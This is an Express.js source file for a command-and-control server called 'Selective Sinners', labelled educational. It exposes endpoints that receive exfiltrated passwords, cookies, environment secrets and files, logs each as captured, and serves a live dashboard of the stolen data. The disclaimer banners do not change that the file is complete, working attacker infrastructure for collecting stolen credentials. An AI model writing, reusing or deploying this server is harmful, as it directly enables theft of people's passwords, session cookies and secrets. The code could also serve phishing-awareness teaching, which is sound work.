const express = require("express");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = 4000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const store = {
  passwords: [],
  cookies: [],
  env: [],
  files: [],
};

function timestamp() {
  return new Date().toISOString();
}

app.post("/log/password", (req, res) => {
  const entry = { ...req.body, receivedAt: timestamp() };
  store.passwords.push(entry);
  console.log("\x1b[31m[PASSWORD CAPTURED]\x1b[0m", JSON.stringify(entry, null, 2));
  res.json({ status: "received" });
});

app.post("/log/cookies", (req, res) => {
  const entry = { cookies: req.body, receivedAt: timestamp() };
  store.cookies.push(entry);
  console.log("\x1b[33m[COOKIES CAPTURED]\x1b[0m", JSON.stringify(entry, null, 2));
  res.json({ status: "received" });
});

app.post("/log/env", (req, res) => {
  const entry = { ...req.body, receivedAt: timestamp() };
  store.env.push(entry);
  console.log("\x1b[35m[ENV CAPTURED]\x1b[0m", JSON.stringify(entry, null, 2));
  res.json({ status: "received" });
});

app.post("/log/files", (req, res) => {
  const entry = { ...req.body, receivedAt: timestamp() };
  store.files.push(entry);
  console.log("\x1b[36m[FILES CAPTURED]\x1b[0m", JSON.stringify(entry, null, 2));
  res.json({ status: "received" });
});

app.get("/api/data", (_req, res) => {
  res.json(store);
});

app.get("/", (_req, res) => {
  res.send(dashboardHTML());
});

function dashboardHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Selective Sinners — C2 Dashboard</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Courier New', monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
    }
    header {
      background: linear-gradient(90deg, #1a0000, #0a0a0a);
      border-bottom: 2px solid #ff0040;
      padding: 20px 32px;
      display: flex;
      align-items: center;
      gap: 16px;
    }
    header h1 {
      font-size: 1.6rem;
      color: #ff0040;
      text-shadow: 0 0 10px rgba(255,0,64,0.5);
    }
    header .subtitle {
      color: #666;
      font-size: 0.85rem;
    }
    .status-bar {
      background: #111;
      padding: 8px 32px;
      font-size: 0.75rem;
      color: #555;
      border-bottom: 1px solid #222;
      display: flex;
      justify-content: space-between;
    }
    .status-bar .live {
      color: #00ff41;
      animation: blink 1.5s infinite;
    }
    @keyframes blink { 50% { opacity: 0.3; } }
    main {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      padding: 24px 32px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .panel {
      background: #111;
      border: 1px solid #222;
      border-radius: 6px;
      overflow: hidden;
    }
    .panel-header {
      padding: 12px 16px;
      font-size: 0.85rem;
      font-weight: bold;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .panel-header .count {
      background: #222;
      padding: 2px 10px;
      border-radius: 10px;
      font-size: 0.75rem;
    }
    .panel.passwords .panel-header { background: #1a0000; color: #ff4444; border-bottom: 1px solid #331111; }
    .panel.cookies .panel-header { background: #1a1400; color: #ffaa00; border-bottom: 1px solid #332a00; }
    .panel.env .panel-header { background: #0f001a; color: #cc44ff; border-bottom: 1px solid #220033; }
    .panel.files .panel-header { background: #001a1a; color: #00cccc; border-bottom: 1px solid #003333; }
    .panel-body {
      padding: 16px;
      max-height: 400px;
      overflow-y: auto;
      font-size: 0.8rem;
      line-height: 1.6;
    }
    .panel-body::-webkit-scrollbar { width: 6px; }
    .panel-body::-webkit-scrollbar-track { background: #111; }
    .panel-body::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
    .entry {
      background: #0d0d0d;
      border: 1px solid #1a1a1a;
      border-radius: 4px;
      padding: 10px;
      margin-bottom: 8px;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .empty {
      color: #333;
      font-style: italic;
      text-align: center;
      padding: 30px;
    }
    footer {
      text-align: center;
      padding: 20px;
      color: #333;
      font-size: 0.7rem;
    }
  </style>
</head>
<body>
  <header>
    <h1>SELECTIVE SINNERS</h1>
    <span class="subtitle">Educational C2 Dashboard — localhost:4000</span>
  </header>
  <div class="status-bar">
    <span><span class="live">● LIVE</span> — Listening for exfiltrated data</span>
    <span id="clock"></span>
  </div>
  <main>
    <div class="panel passwords">
      <div class="panel-header">
        PASSWORDS
        <span class="count" id="pw-count">0</span>
      </div>
      <div class="panel-body" id="pw-body"><div class="empty">Waiting for captures...</div></div>
    </div>
    <div class="panel cookies">
      <div class="panel-header">
        COOKIES
        <span class="count" id="ck-count">0</span>
      </div>
      <div class="panel-body" id="ck-body"><div class="empty">Waiting for captures...</div></div>
    </div>
    <div class="panel env">
      <div class="panel-header">
        ENV / SECRETS
        <span class="count" id="env-count">0</span>
      </div>
      <div class="panel-body" id="env-body"><div class="empty">Waiting for captures...</div></div>
    </div>
    <div class="panel files">
      <div class="panel-header">
        FILES
        <span class="count" id="file-count">0</span>
      </div>
      <div class="panel-body" id="file-body"><div class="empty">Waiting for captures...</div></div>
    </div>
  </main>
  <footer>FOR EDUCATIONAL PURPOSES ONLY — Think Before You Click</footer>
  <script>
    function updateClock() {
      document.getElementById('clock').textContent = new Date().toLocaleTimeString();
    }
    setInterval(updateClock, 1000);
    updateClock();

    function renderEntries(data, elementId, countId) {
      const body = document.getElementById(elementId);
      const count = document.getElementById(countId);
      count.textContent = data.length;
      if (data.length === 0) {
        body.innerHTML = '<div class="empty">Waiting for captures...</div>';
        return;
      }
      body.innerHTML = data.map(e =>
        '<div class="entry">' + escapeHtml(JSON.stringify(e, null, 2)) + '</div>'
      ).join('');
    }

    function escapeHtml(str) {
      return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    async function poll() {
      try {
        const res = await fetch('/api/data');
        const data = await res.json();
        renderEntries(data.passwords, 'pw-body', 'pw-count');
        renderEntries(data.cookies, 'ck-body', 'ck-count');
        renderEntries(data.env, 'env-body', 'env-count');
        renderEntries(data.files, 'file-body', 'file-count');
      } catch {}
    }
    setInterval(poll, 2000);
    poll();
  </script>
</body>
</html>`;
}

app.listen(PORT, () => {
  console.log("");
  console.log("  ╔══════════════════════════════════════════╗");
  console.log("  ║   SELECTIVE SINNERS — C2 Server          ║");
  console.log("  ║   Dashboard: http://localhost:" + PORT + "        ║");
  console.log("  ║   FOR EDUCATIONAL PURPOSES ONLY          ║");
  console.log("  ╚══════════════════════════════════════════╝");
  console.log("");
  console.log("  Endpoints:");
  console.log("    POST /log/password");
  console.log("    POST /log/cookies");
  console.log("    POST /log/env");
  console.log("    POST /log/files");
  console.log("    GET  /api/data");
  console.log("");
});
